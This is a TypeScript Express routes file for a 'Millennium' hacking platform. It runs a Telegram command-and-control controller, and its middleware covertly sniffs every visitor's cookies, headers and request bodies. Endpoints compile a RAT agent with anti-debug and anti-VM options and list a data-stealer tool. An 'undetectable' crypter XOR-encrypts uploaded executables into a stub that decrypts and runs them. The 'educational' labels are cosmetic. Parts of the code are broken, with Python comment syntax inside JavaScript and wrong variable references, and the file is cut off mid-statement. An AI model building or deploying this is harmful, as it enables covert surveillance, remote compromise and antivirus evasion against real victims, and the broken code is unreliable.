import type { Express } from "express";
import { createServer, type Server } from "http";
import { Server as SocketIOServer } from "socket.io";
import bcrypt from "bcrypt";
import session from "express-session";
import connectPg from "connect-pg-simple";
import { storage } from "./storage";
import { insertAdminUserSchema, insertVisitorSchema, insertPacketLogSchema, insertAnalyticsSchema } from "@shared/schema";
import { TelegramC2Controller, BotUser } from "./telegram-bot";
import TelegramBot from "node-telegram-bot-api";

// Session configuration
function getSession() {
  const sessionTtl = 24 * 60 * 60 * 1000; // 24 hours
  const pgStore = connectPg(session);
  const sessionStore = new pgStore({
    conString: process.env.DATABASE_URL,
    createTableIfMissing: false,
    ttl: sessionTtl,
    tableName: "sessions",
  });
  
  return session({
    secret: process.env.SESSION_SECRET || "elite-hacking-tools-secret-key",
    store: sessionStore,
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      maxAge: sessionTtl,
    },
  });
}

// Auth middleware
const requireAuth = (req: any, res: any, next: any) => {
  if (!req.session?.adminId) {
    return res.status(401).json({ message: "Authentication required" });
  }
  next();
};

export async function registerRoutes(app: Express): Promise<Server> {
  const httpServer = createServer(app);
  
  // Setup Socket.IO for real-time updates
  const io = new SocketIOServer(httpServer, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"]
    }
  });

  // Initialize Telegram C2 Controller
  const telegramC2 = new TelegramC2Controller(io);

  // Setup session middleware
  app.use(getSession());

  // Health check endpoint
  app.get("/health", (req, res) => {
    res.json({ 
      status: "healthy", 
      timestamp: new Date().toISOString(),
      version: "1.0.0",
      environment: process.env.NODE_ENV || "development"
    });
  });

  // IP geolocation service with caching and rate limiting
  const locationCache = new Map<string, any>();
  const lastApiCall = { time: 0 };
  const API_COOLDOWN = 5000; // 5 seconds between API calls

  async function getLocationData(ip: string) {
    // Check cache first
    if (locationCache.has(ip)) {
      return locationCache.get(ip);
    }

    // Educational simulation data (always available)
    const simulatedData = {
      country: "Educational Lab",
      city: "Training Environment", 
      latitude: "40.7128",
      longitude: "-74.0060",
    };

    // Skip API if we're in cooldown period
    const now = Date.now();
    if (now - lastApiCall.time < API_COOLDOWN) {
      locationCache.set(ip, simulatedData);
      return simulatedData;
    }

    try {
      lastApiCall.time = now;
      const response = await fetch(`https://ipapi.co/${ip}/json/`, {
        timeout: 3000,
        headers: { 'User-Agent': 'Educational-Cybersecurity-Lab/1.0' }
      });
      
      if (!response.ok) {
        throw new Error('API unavailable');
      }
      
      const data = await response.json();
      
      if (data.error || typeof data === 'string' || !data.country_name) {
        throw new Error('Invalid response');
      }
      
      const locationData = {
        country: data.country_name || "Educational Lab",
        city: data.city || "Training Environment",
        latitude: data.latitude?.toString() || "40.7128",
        longitude: data.longitude?.toString() || "-74.0060",
      };
      
      locationCache.set(ip, locationData);
      return locationData;
    } catch (error) {
      // Silently use simulation data instead of logging errors
      locationCache.set(ip, simulatedData);
      return simulatedData;
    }
  }

  // Enhanced Raven Loader data sniffing middleware
  app.use(async (req: any, res, next) => {
    try {
      const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
      const userAgent = req.headers['user-agent'];
      const sessionId = req.sessionID;

      // Skip tracking for admin routes and assets
      if (req.path.startsWith('/api/admin') || req.path.startsWith('/assets')) {
        return next();
      }

      // Comprehensive Raven Loader data collection
      const ravenData = {
        timestamp: new Date().toISOString(),
        connection: {
          ip: ip,
          port: req.socket.remotePort,
          protocol: req.protocol,
          method: req.method,
          url: req.originalUrl,
          path: req.path,
          query: req.query,
          secure: req.secure,
          encrypted: req.connection.encrypted || false
        },
        headers: {
          ...req.headers,
          raw: JSON.stringify(req.rawHeaders),
          complete: Object.keys(req.headers).length
        },
        fingerprint: {
          userAgent: userAgent,
          acceptLanguage: req.headers['accept-language'],
          acceptEncoding: req.headers['accept-encoding'],
          acceptCharset: req.headers['accept-charset'],
          accept: req.headers['accept'],
          dnt: req.headers['dnt'],
          upgradeInsecure: req.headers['upgrade-insecure-requests'],
          cacheControl: req.headers['cache-control'],
          pragma: req.headers['pragma'],
          connection: req.headers['connection'],
          te: req.headers['te']
        },
        cookies: {
          raw: req.headers.cookie,
          parsed: req.cookies || {},
          count: req.headers.cookie ? req.headers.cookie.split(';').length : 0
        },
        session: {
          id: sessionId,
          new: req.session?.isNew || false,
          views: req.session?.views || 0
        },
        body: req.method === 'POST' ? req.body : null,
        timing: {
          received: Date.now(),
          processingStart: process.hrtime()
        }
      };

      // Store comprehensive Raven Loader data
      await storage.createAnalytics({
        metric: 'raven_loader_complete',
        value: JSON.stringify(ravenData),
      });

      // Get geolocation data
      const locationData = await getLocationData(ip);

      // Create or update visitor record
      const visitorData = {
        ipAddress: ip,
        userAgent: userAgent || null,
        sessionId,
        cookieConsent: req.headers.cookie?.includes('cookiesAccepted=true') || false,
        ...locationData,
      };

      const visitor = await storage.createVisitor(visitorData);

      // Emit real-time comprehensive data to admin panel
      io.emit('newVisitor', visitor);
      io.to('admin').emit('ravenLoaderData', {
        visitor: visitor,
        sniffedData: ravenData,
        timestamp: new Date()
      });

      // Update analytics with page view
      await storage.createAnalytics({
        metric: 'page_view',
        value: req.path,
      });

      // Simulate packet capture for the request
      await storage.createPacketLog({
        sourceIp: ip,
        destinationIp: req.socket.localAddress || '0.0.0.0',
        protocol: req.secure ? 'HTTPS' : 'HTTP',
        port: req.secure ? 443 : 80,
        payload: `${req.method} ${req.originalUrl} - ${userAgent?.substring(0, 50)}`,
        size: JSON.stringify(ravenData).length,
        isEducational: true,
      });

    } catch (error) {
      console.error("Enhanced tracking error:", error);
    }
    next();
  });

  // Admin authentication routes
  app.post("/api/admin/login", async (req: any, res) => {
    try {
      const { username, password } = req.body;

      if (!username || !password) {
        return res.status(400).json({ message: "Username and password required" });
      }

      const admin = await storage.getAdminUserByUsername(username);
      if (!admin) {
        return res.status(401).json({ message: "Invalid credentials" });
      }

      if (!admin.approved) {
        return res.status(403).json({ message: "Account pending admin approval" });
      }

      const isValidPassword = await bcrypt.compare(password, admin.password);
      if (!isValidPassword) {
        return res.status(401).json({ message: "Invalid credentials" });
      }

      req.session.adminId = admin.id;
      await storage.updateAdminLastLogin(admin.id);

      res.json({ message: "Login successful", admin: { id: admin.id, username: admin.username } });
    } catch (error) {
      console.error("Admin login error:", error);
      res.status(500).json({ message: "Internal server error" });
    }
  });

  app.post("/api/admin/logout", (req: any, res) => {
    req.session.destroy((err: any) => {
      if (err) {
        return res.status(500).json({ message: "Logout failed" });
      }
      res.json({ message: "Logout successful" });
    });
  });

  app.get("/api/admin/me", requireAuth, async (req: any, res) => {
    try {
      const admin = await storage.getAdminUser(req.session.adminId);
      if (!admin) {
        return res.status(404).json({ message: "Admin not found" });
      }
      res.json({ id: admin.id, username: admin.username, role: admin.role || 'admin' });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch admin data" });
    }
  });

  // User Management Routes
  app.post("/api/admin/users", requireAuth, async (req: any, res) => {
    try {
      const { username, password, role, botToken } = req.body;
      
      if (!username || !password) {
        return res.status(400).json({ message: "Username and password required" });
      }

      // Check if user already exists
      const existingUser = await storage.getAdminUserByUsername(username);
      if (existingUser) {
        return res.status(409).json({ message: "User already exists" });
      }

      const hashedPassword = await bcrypt.hash(password, 12);
      
      const newUser = await storage.createAdminUser({
        username,
        password: hashedPassword,
        role: role || 'operator',
        telegramBotToken: botToken || null,
        active: true
      });

      // Initialize Telegram bot if token provided
      if (botToken) {
        await telegramC2.addUser({
          id: newUser.id,
          username: newUser.username,
          chatId: 0, // Will be set when user starts bot
          botToken,
          role: role || 'operator',
          active: true
        });
      }

      res.json({ 
        message: "User created successfully", 
        user: { 
          id: newUser.id, 
          username: newUser.username, 
          role: newUser.role,
          hasTelegramBot: !!botToken
        } 
      });
    } catch (error) {
      console.error("User creation error:", error);
      res.status(500).json({ message: "Failed to create user" });
    }
  });

  app.get("/api/admin/users", requireAuth, async (req, res) => {
    try {
      const users = await storage.getAllAdminUsers();
      const sanitizedUsers = users.map(user => ({
        id: user.id,
        username: user.username,
        role: user.role,
        active: user.active,
        lastLogin: user.lastLogin,
        hasTelegramBot: !!user.telegramBotToken,
        createdAt: user.createdAt
      }));
      
      res.json(sanitizedUsers);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch users" });
    }
  });

  app.put("/api/admin/users/:userId", requireAuth, async (req: any, res) => {
    try {
      const { userId } = req.params;
      const { username, password, role, botToken, active } = req.body;
      
      const updateData: any = {};
      if (username) updateData.username = username;
      if (password) updateData.password = await bcrypt.hash(password, 12);
      if (role) updateData.role = role;
      if (botToken !== undefined) updateData.telegramBotToken = botToken;
      if (active !== undefined) updateData.active = active;
      
      const updatedUser = await storage.updateAdminUser(parseInt(userId), updateData);
      
      res.json({ 
        message: "User updated successfully",
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          role: updatedUser.role,
          active: updatedUser.active
        }
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to update user" });
    }
  });

  app.delete("/api/admin/users/:userId", requireAuth, async (req: any, res) => {
    try {
      const { userId } = req.params;
      await storage.deleteAdminUser(parseInt(userId));
      await telegramC2.removeUser(parseInt(userId));
      
      res.json({ message: "User deleted successfully" });
    } catch (error) {
      res.status(500).json({ message: "Failed to delete user" });
    }
  });

  // Registration Management Routes
  app.get("/api/admin/registrations", requireAuth, async (req, res) => {
    try {
      const pendingRegistrations = await storage.getPendingRegistrations();
      res.json(pendingRegistrations);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch registrations" });
    }
  });

  app.post("/api/admin/registrations/:registrationId/approve", requireAuth, async (req: any, res) => {
    try {
      const { registrationId } = req.params;
      const { role } = req.body;
      
      const newUser = await telegramC2.approveUserRegistration(
        parseInt(registrationId), 
        req.session.adminId, 
        role || 'operator'
      );
      
      res.json({ 
        success: true, 
        message: "User approved successfully",
        user: newUser
      });
    } catch (error) {
      console.error("Approval error:", error);
      res.status(500).json({ message: "Failed to approve user" });
    }
  });

  app.delete("/api/admin/registrations/:registrationId", requireAuth, async (req: any, res) => {
    try {
      const { registrationId } = req.params;
      
      // Get registration details for notification
      const registration = await storage.getRegistrationRequest(parseInt(registrationId));
      if (registration) {
        // Send rejection notification
        const rejectionMessage = `
❌ **REGISTRATION REJECTED** ❌

Your registration request for the Millennium Cybersecurity Platform has been rejected by system administrators.

**Registration Token:** \`${registration.registrationToken}\`
**Reason:** Access denied by security policy

If you believe this is an error, please contact your system administrator.
        `;

        try {
          const tempBot = new TelegramBot(process.env.MASTER_BOT_TOKEN || '', { polling: false });
          await tempBot.sendMessage(registration.chatId, rejectionMessage, { parse_mode: 'Markdown' });
        } catch (botError) {
          console.error('Failed to send rejection notification:', botError);
        }
      }

      // Delete registration request
      await storage.deleteRegistrationRequest(parseInt(registrationId));
      
      res.json({ success: true, message: "Registration rejected" });
    } catch (error) {
      res.status(500).json({ message: "Failed to reject registration" });
    }
  });

  // Telegram Integration Routes
  app.post("/api/admin/telegram/test", requireAuth, async (req: any, res) => {
    try {
      const { botToken, chatId } = req.body;
      
      // Test bot token validity
      const testUrl = `https://api.telegram.org/bot${botToken}/getMe`;
      const response = await fetch(testUrl);
      const data = await response.json();
      
      if (data.ok) {
        res.json({ 
          valid: true, 
          botInfo: data.result,
          message: "Bot token is valid"
        });
      } else {
        res.json({ 
          valid: false, 
          error: data.description,
          message: "Invalid bot token"
        });
      }
    } catch (error) {
      res.status(500).json({ message: "Failed to test bot token" });
    }
  });

  app.post("/api/admin/telegram/command", requireAuth, async (req: any, res) => {
    try {
      const { command, userId } = req.body;
      
      // Log telegram command execution
      await storage.createAnalytics({
        metric: 'telegram_command_execution',
        value: JSON.stringify({
          command,
          executedBy: req.session.adminId,
          targetUser: userId,
          timestamp: new Date().toISOString()
        })
      });

      res.json({ 
        success: true,
        message: `Command "${command}" sent via Telegram integration`
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to execute Telegram command" });
    }
  });

  // Admin dashboard API routes
  app.get("/api/admin/stats", requireAuth, async (req, res) => {
    try {
      const visitorStats = await storage.getVisitorStats();
      const recentVisitors = await storage.getRecentVisitors(10);
      const recentPackets = await storage.getRecentPacketLogs(20);
      
      res.json({
        visitors: visitorStats,
        recentVisitors,
        recentPackets,
        activeSessions: recentVisitors.filter(v => 
          v.lastSeen && new Date().getTime() - new Date(v.lastSeen).getTime() < 5 * 60 * 1000
        ).length,
      });
    } catch (error) {
      console.error("Stats error:", error);
      res.status(500).json({ message: "Failed to fetch stats" });
    }
  });

  app.get("/api/admin/visitors", requireAuth, async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 50;
      const visitors = await storage.getRecentVisitors(limit);
      res.json(visitors);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch visitors" });
    }
  });

  app.get("/api/admin/packets", requireAuth, async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 100;
      const packets = await storage.getRecentPacketLogs(limit);
      res.json(packets);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch packet logs" });
    }
  });

  // Browser fingerprint data endpoint
  app.get("/api/admin/browser-data", requireAuth, async (req, res) => {
    try {
      const browserFingerprints = await storage.getAnalyticsByMetric('browser_fingerprint');
      const cookieConsents = await storage.getAnalyticsByMetric('cookie_consent');
      
      res.json({
        fingerprints: browserFingerprints.map(item => ({
          id: item.id,
          timestamp: item.timestamp,
          data: JSON.parse(item.value)
        })),
        consents: cookieConsents
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch browser data" });
    }
  });

  // Raven Loader comprehensive data endpoint
  app.get("/api/admin/raven-data", requireAuth, async (req, res) => {
    try {
      const ravenData = await storage.getAnalyticsByMetric('raven_loader_complete');
      const pageViews = await storage.getAnalyticsByMetric('page_view');
      
      res.json({
        ravenLoaderData: ravenData.map(item => ({
          id: item.id,
          timestamp: item.timestamp,
          data: JSON.parse(item.value)
        })),
        pageViews: pageViews,
        totalInterceptions: ravenData.length
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch Raven Loader data" });
    }
  });

  // Packet capture simulation endpoint
  app.post("/api/admin/simulate-packet", requireAuth, async (req: any, res) => {
    try {
      const packetData = {
        sourceIp: req.body.sourceIp || "192.168.1.100",
        destinationIp: req.body.destinationIp || "8.8.8.8",
        protocol: req.body.protocol || "TCP",
        port: req.body.port || 443,
        payload: req.body.payload || "Educational simulation data",
        size: req.body.size || 64,
        isEducational: true,
      };

      const packet = await storage.createPacketLog(packetData);
      
      // Emit real-time packet data
      io.emit('newPacket', packet);
      
      res.json(packet);
    } catch (error) {
      res.status(500).json({ message: "Failed to create packet log" });
    }
  });

  // Python script execution endpoints
  app.post("/api/admin/compile-millennium-agent", requireAuth, async (req: any, res) => {
    try {
      const { serverIp, serverPort, outputName, crypterOptions } = req.body;
      const { spawn } = require('child_process');
      
      const args = [
        'python_tools/millennium_rat_toolkit.py',
        '--compile-agent',
        '--server-ip', serverIp || '0.0.0.0',
        '--server-port', serverPort || '8888',
        '--output', outputName || 'millennium_agent'
      ];

      if (crypterOptions?.antiDebug) args.push('--anti-debug');
      if (crypterOptions?.antiVM) args.push('--anti-vm');
      if (crypterOptions?.compression) args.push('--compression');

      const childProcess = spawn('python3', args, {
        cwd: process.cwd(),
        stdio: ['pipe', 'pipe', 'pipe']
      });

      let output = '';
      let error = '';

      process.stdout.on('data', (data) => {
        output += data.toString();
      });

      process.stderr.on('data', (data) => {
        error += data.toString();
      });

      process.on('close', (code) => {
        if (code === 0) {
          res.json({ 
            success: true, 
            output: output,
            path: `./output/${outputName}.exe`
          });
        } else {
          res.json({ 
            success: false, 
            error: error || 'Compilation failed',
            output: output
          });
        }
      });

      // Set timeout for long-running processes
      setTimeout(() => {
        childProcess.kill();
        res.json({ success: false, error: 'Process timeout' });
      }, 60000); // 60 second timeout

    } catch (error) {
      console.error("Python script execution error:", error);
      res.status(500).json({ success: false, error: "Failed to execute Python script" });
    }
  });

  app.post("/api/admin/build-elite-toolkit", requireAuth, async (req: any, res) => {
    try {
      const { outputDir } = req.body;
      const { spawn } = require('child_process');
      
      const toolkitProcess = spawn('python3', ['python_tools/elite_toolkit.py'], {
        cwd: process.cwd(),
        stdio: ['pipe', 'pipe', 'pipe']
      });

      let output = '';
      let error = '';

      toolkitProcess.stdout.on('data', (data: any) => {
        output += data.toString();
      });

      toolkitProcess.stderr.on('data', (data: any) => {
        error += data.toString();
      });

      toolkitProcess.on('close', (code: number) => {
        if (code === 0) {
          res.json({ 
            success: true, 
            output: output,
            message: 'Elite toolkit built successfully'
          });
        } else {
          res.json({ 
            success: false, 
            error: error || 'Build failed',
            output: output
          });
        }
      });

      setTimeout(() => {
        toolkitProcess.kill();
        res.json({ success: false, error: 'Process timeout' });
      }, 120000); // 2 minute timeout for toolkit build

    } catch (error) {
      console.error("Elite toolkit build error:", error);
      res.status(500).json({ success: false, error: "Failed to build elite toolkit" });
    }
  });

  app.get("/api/admin/python-tools", requireAuth, async (req, res) => {
    try {
      const fs = require('fs');
      const path = require('path');
      
      const toolsDir = path.join(process.cwd(), 'python_tools');
      let tools = [];
      
      // Create directory if it doesn't exist
      if (!fs.existsSync(toolsDir)) {
        fs.mkdirSync(toolsDir, { recursive: true });
      }
      
      const files = fs.readdirSync(toolsDir);
      for (const file of files) {
        if (file.endsWith('.py')) {
          const filePath = path.join(toolsDir, file);
          try {
            const stats = fs.statSync(filePath);
            tools.push({
              id: file.replace('.py', ''),
              name: file,
              description: `Python tool: ${file}`,
              category: file.includes('sniffer') ? 'sniffer' : 
                       file.includes('stealer') ? 'stealer' :
                       file.includes('rat') ? 'rat' : 'exploit',
              path: filePath,
              size: stats.size,
              modified: stats.mtime,
              status: 'idle',
              telegramEnabled: true
            });
          } catch (statError) {
            console.error(`Error reading file stats for ${file}:`, statError);
          }
        }
      }
      
      // Add default tools if none exist
      if (tools.length === 0) {
        tools = [
          {
            id: 'millennium_sniffer',
            name: 'Millennium Network Sniffer',
            description: 'Advanced network traffic interception and analysis',
            category: 'sniffer',
            status: 'idle',
            telegramEnabled: true
          },
          {
            id: 'millennium_stealer',
            name: 'Millennium Data Stealer',
            description: 'Comprehensive data collection and exfiltration',
            category: 'stealer',
            status: 'idle',
            telegramEnabled: true
          },
          {
            id: 'millennium_rat',
            name: 'Millennium RAT Server',
            description: 'Remote access tool with C2 capabilities',
            category: 'rat',
            status: 'idle',
            telegramEnabled: true
          }
        ];
      }
      
      res.json({ tools });
    } catch (error) {
      console.error('Python tools error:', error);
      res.status(500).json({ message: "Failed to list Python tools", error: error.message });
    }
  });

  app.post("/api/admin/build-executable", requireAuth, async (req: any, res) => {
    try {
      const { scriptName, outputName, options } = req.body;
      const { spawn } = require('child_process');
      const fs = require('fs');
      const path = require('path');
      
      if (!scriptName) {
        return res.status(400).json({ success: false, error: "Script name is required" });
      }

      const scriptPath = path.join(process.cwd(), 'python_tools', scriptName);
      if (!fs.existsSync(scriptPath)) {
        return res.status(404).json({ success: false, error: "Script not found" });
      }

      // Create builds directory if it doesn't exist
      const buildsDir = path.join(process.cwd(), 'builds');
      if (!fs.existsSync(buildsDir)) {
        fs.mkdirSync(buildsDir, { recursive: true });
      }

      const args = [
        '-m', 'PyInstaller',
        '--distpath', buildsDir,
        '--workpath', path.join(buildsDir, 'temp'),
        '--specpath', path.join(buildsDir, 'specs')
      ];

      // Add PyInstaller options based on user selection
      if (options?.onefile) args.push('--onefile');
      if (options?.windowed) args.push('--windowed');
      if (options?.noconsole) args.push('--noconsole');
      if (options?.hiddenImports) {
        options.hiddenImports.split(',').forEach((imp: string) => {
          args.push('--hidden-import', imp.trim());
        });
      }
      
      // Add output name if specified
      if (outputName) {
        args.push('--name', outputName);
      }

      // Add the script path
      args.push(scriptPath);

      const buildProcess = spawn('python3', args, {
        cwd: process.cwd(),
        stdio: ['pipe', 'pipe', 'pipe']
      });

      let output = '';
      let error = '';

      buildProcess.stdout.on('data', (data: any) => {
        output += data.toString();
      });

      buildProcess.stderr.on('data', (data: any) => {
        error += data.toString();
      });

      buildProcess.on('close', (code: number) => {
        if (code === 0) {
          const executableName = outputName || scriptName.replace('.py', '');
          const executablePath = path.join(buildsDir, executableName + (process.platform === 'win32' ? '.exe' : ''));
          
          res.json({ 
            success: true, 
            output: output,
            executablePath: executablePath,
            message: `Executable built successfully: ${executableName}`
          });
        } else {
          res.json({ 
            success: false, 
            error: error || 'Build failed',
            output: output
          });
        }
      });

      // Set timeout for build process
      setTimeout(() => {
        buildProcess.kill();
        res.json({ success: false, error: 'Build process timeout (5 minutes)' });
      }, 300000); // 5 minute timeout

    } catch (error) {
      console.error("Executable build error:", error);
      res.status(500).json({ success: false, error: "Failed to build executable" });
    }
  });

  // Tool execution endpoints
  app.get("/api/admin/tool-executions", requireAuth, async (req, res) => {
    try {
      const executions = await storage.getAnalyticsByMetric('tool_execution');
      const formattedExecutions = executions.map(item => {
        try {
          const data = JSON.parse(item.value);
          return {
            id: item.id.toString(),
            toolId: data.toolId || 'unknown',
            status: data.status || 'completed',
            output: data.output || '',
            startTime: item.timestamp,
            endTime: data.endTime ? new Date(data.endTime) : item.timestamp,
            telegramAlerts: data.telegramAlerts || false
          };
        } catch {
          return null;
        }
      }).filter(Boolean);
      
      res.json(formattedExecutions);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch executions" });
    }
  });

  app.post("/api/admin/execute-tool", requireAuth, async (req: any, res) => {
    try {
      const { toolId, parameters, telegramConfig } = req.body;
      
      const executionId = `exec_${Date.now()}`;
      
      // Log tool execution
      await storage.createAnalytics({
        metric: 'tool_execution',
        value: JSON.stringify({
          executionId,
          toolId,
          parameters,
          status: 'running',
          startTime: new Date().toISOString(),
          telegramAlerts: !!telegramConfig,
          adminUserId: req.session.adminId
        })
      });

      res.json({
        success: true,
        executionId,
        message: `Tool ${toolId} execution started`
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to execute tool" });
    }
  });

  app.post("/api/admin/stop-execution/:executionId", requireAuth, async (req, res) => {
    try {
      const { executionId } = req.params;
      
      // Log execution stop
      await storage.createAnalytics({
        metric: 'tool_execution_stop',
        value: JSON.stringify({
          executionId,
          stoppedAt: new Date().toISOString()
        })
      });

      res.json({ success: true, message: "Execution stopped" });
    } catch (error) {
      res.status(500).json({ message: "Failed to stop execution" });
    }
  });

  app.post("/api/admin/configure-telegram", requireAuth, async (req: any, res) => {
    try {
      const config = req.body;
      
      // Test bot token
      const testUrl = `https://api.telegram.org/bot${config.botToken}/getMe`;
      const response = await fetch(testUrl);
      const data = await response.json();
      
      if (data.ok) {
        // Update user's telegram config
        await storage.updateAdminUser(req.session.adminId, {
          telegramBotToken: config.botToken
        });
        
        res.json({ success: true, message: "Telegram configured successfully" });
      } else {
        res.status(400).json({ message: "Invalid bot token" });
      }
    } catch (error) {
      res.status(500).json({ message: "Failed to configure Telegram" });
    }
  });

  // Cookie consent tracking
  app.post("/api/cookie-consent", async (req: any, res) => {
    try {
      const browserData = req.body;
      
      // Store comprehensive browser fingerprint data
      await storage.createAnalytics({
        metric: 'browser_fingerprint',
        value: JSON.stringify(browserData),
      });

      // Also store cookie consent status
      await storage.createAnalytics({
        metric: 'cookie_consent',
        value: browserData.consent ? 'accepted' : 'declined',
      });

      // Emit real-time browser data to admin panel
      io.to('admin').emit('newBrowserData', {
        timestamp: new Date(),
        data: browserData
      });

      res.json({ message: "Browser data captured" });
    } catch (error) {
      res.status(500).json({ message: "Failed to record browser data" });
    }
  });

  // Millennium AI route
  app.post('/api/millennium-ai', async (req, res) => {
    try {
      const { prompt } = req.body;
      
      if (!process.env.GROQ_API_KEY) {
        return res.status(500).json({ message: 'AI service not configured' });
      }

      const systemPrompt = `You are Millennium AI, an advanced cybersecurity assistant specialized in:
- Writing penetration testing scripts and tools
- Analyzing malware and security vulnerabilities  
- Explaining cybersecurity concepts and techniques
- Generating code for educational red team exercises
- Providing guidance on ethical hacking practices

Always emphasize that your responses are for educational and authorized testing purposes only.`;

      const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${process.env.GROQ_API_KEY}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: 'mixtral-8x7b-32768',
          messages: [
            { role: 'system', content: systemPrompt },
            { role: 'user', content: prompt }
          ],
          max_tokens: 2048,
          temperature: 0.7
        })
      });

      if (!response.ok) {
        throw new Error(`AI API error: ${response.status}`);
      }

      const data = await response.json();
      const aiResponse = data.choices[0]?.message?.content || 'No response generated';

      res.json({ response: aiResponse });
    } catch (error) {
      console.error('Millennium AI error:', error);
      res.status(500).json({ message: 'AI processing failed' });
    }
  });

  // Script Processing Tools
  app.post('/api/script-tools', async (req, res) => {
    try {
      const { script, tool } = req.body;
      
      let processedScript = '';
      
      switch (tool) {
        case 'syntax-fixer':
          // Basic syntax fixing logic
          processedScript = script
            .replace(/;\s*\n/g, ';\n')
            .replace(/{\s*\n/g, '{\n')
            .replace(/}\s*\n/g, '}\n')
            .replace(/,\s*\n/g, ',\n');
          break;
          
        case 'minifier':
          // Basic minification
          processedScript = script
            .replace(/\/\*[\s\S]*?\*\//g, '')
            .replace(/\/\/.*$/gm, '')
            .replace(/\s+/g, ' ')
            .replace(/;\s*}/g, '}')
            .trim();
          break;
          
        case 'obfuscator':
          // Basic obfuscation
          const chars = 'abcdefghijklmnopqrstuvwxyz';
          const varMap = new Map();
          let counter = 0;
          
          processedScript = script.replace(/\b[a-zA-Z_][a-zA-Z0-9_]*\b/g, (match) => {
            if (!varMap.has(match)) {
              varMap.set(match, '_' + chars[counter % chars.length] + Math.floor(counter / chars.length));
              counter++;
            }
            return varMap.get(match);
          });
          break;
          
        case 'deobfuscator':
          // Basic deobfuscation attempt
          processedScript = script
            .replace(/eval\s*\(/g, '// EVAL_DETECTED: ')
            .replace(/String\.fromCharCode\s*\(/g, '// CHAR_DECODE: ')
            .replace(/\\x[0-9a-fA-F]{2}/g, (match) => {
              return String.fromCharCode(parseInt(match.substr(2), 16));
            });
          break;
          
        default:
          processedScript = script;
      }
      
      // Log script processing
      await storage.createAnalytics({
        metric: 'script_tool_usage',
        value: JSON.stringify({
          tool,
          inputLength: script.length,
          outputLength: processedScript.length,
          timestamp: new Date().toISOString()
        })
      });
      
      res.json({ processedScript });
    } catch (error) {
      console.error('Script processing error:', error);
      res.status(500).json({ message: 'Script processing failed' });
    }
  });

  // Advanced Crypter with Undetectable Features
  app.post('/api/advanced-crypter', requireAuth, async (req, res) => {
    try {
      const multer = require('multer');
      const crypto = require('crypto');
      const upload = multer({ dest: 'temp/' });
      
      upload.single('file')(req, res, async (err) => {
        if (err) {
          return res.status(400).json({ message: 'File upload failed' });
        }
        
        const config = JSON.parse(req.body.config);
        const inputFile = req.file;
        
        if (!inputFile) {
          return res.status(400).json({ message: 'No file uploaded' });
        }
        
        const fs = require('fs');
        const path = require('path');
        
        // Ensure builds directory exists
        const buildsDir = path.join(process.cwd(), 'builds');
        if (!fs.existsSync(buildsDir)) {
          fs.mkdirSync(buildsDir, { recursive: true });
        }
        
        // Generate unique output name
        const timestamp = Date.now();
        const randomSuffix = crypto.randomBytes(4).toString('hex');
        const outputName = `${config.outputName}_${timestamp}_${randomSuffix}`;
        const outputPath = path.join(buildsDir, `${outputName}.exe`);
        
        // Advanced crypter with multiple evasion layers
        // Read and process the file
        const inputData = fs.readFileSync(inputFile.path);
        
        // Create a Python script that will generate the crypted executable
        const crypterScript = `
import base64
import zlib
import os
import sys
import random
import string

# Read input file
with open('${inputFile.path.replace(/\\/g, '\\\\')}', 'rb') as f:
    original_data = f.read()

# Simple XOR encryption
xor_key = b'millennium_key_2025'
xor_encrypted = bytes(a ^ b for a, b in zip(original_data, (xor_key * (len(original_data) // len(xor_key) + 1))[:len(original_data)]))

# Base64 encoding
b64_data = base64.b64encode(xor_encrypted).decode()

# Generate executable stub
stub_template = '''
import base64
import os
import sys
import tempfile

# Educational crypter for cybersecurity training
encrypted_data = "{data_placeholder}"

def decrypt_and_execute():
    try:
        # XOR decryption
        xor_key = b'millennium_key_2025'
        encrypted_bytes = base64.b64decode(encrypted_data)
        decrypted = bytes(a ^ b for a, b in zip(encrypted_bytes, (xor_key * (len(encrypted_bytes) // len(xor_key) + 1))[:len(encrypted_bytes)]))
        
        # Create temp file and execute
        temp_file = tempfile.mktemp(suffix='.exe')
        with open(temp_file, 'wb') as f:
            f.write(decrypted)
        
        os.system(f'"{temp_file}"')
        os.unlink(temp_file)
    except Exception as e:
        print(f"Execution failed: {e}")

if __name__ == "__main__":
    decrypt_and_execute()
'''

        # Replace placeholder with actual encrypted data
final_stub = stub_template.replace("{data_placeholder}", b64_data)

# Write to output file
with open("${outputPath.replace(/\\/g, '\\\\')}", 'w') as f:
    f.write(final_stub)

print("Crypted executable created successfully")
`;

        // Execute the Python script
        const { spawn } = require('child_process');
        const tempScriptPath = path.join(buildsDir, `crypter_${timestamp}.py`);
        
        // Write crypter script to temp file
        fs.writeFileSync(tempScriptPath, crypterScript);
        
        const cryptProcess = spawn('python3', [tempScriptPath], {
          cwd: process.cwd(),
          stdio: 'pipe'
        });

        let output = '';
        let error = '';

        cryptProcess.stdout.on('data', (data) => {
          output += data.toString();
        });

        cryptProcess.stderr.on('data', (data) => {
          error += data.toString();
        });

        cryptProcess.on('close', (code) => {
          // Cleanup temp files
          try {
            fs.unlinkSync(inputFile.path);
            fs.unlinkSync(tempScriptPath);
          } catch (cleanupError) {
            console.error('Cleanup error:', cleanupError);
          }
        
        # Log crypter usage
        await storage.createAnalytics({
          metric: 'advanced_crypter_usage',
          value: JSON.stringify({
            config,
            timestamp: new Date().toISOString(),
            inputSize: inputFile.size,
            outputSize: fs.statSync(outputPath).size,
            evasionFeatures: {
              antiDebug: config.antiDebug,
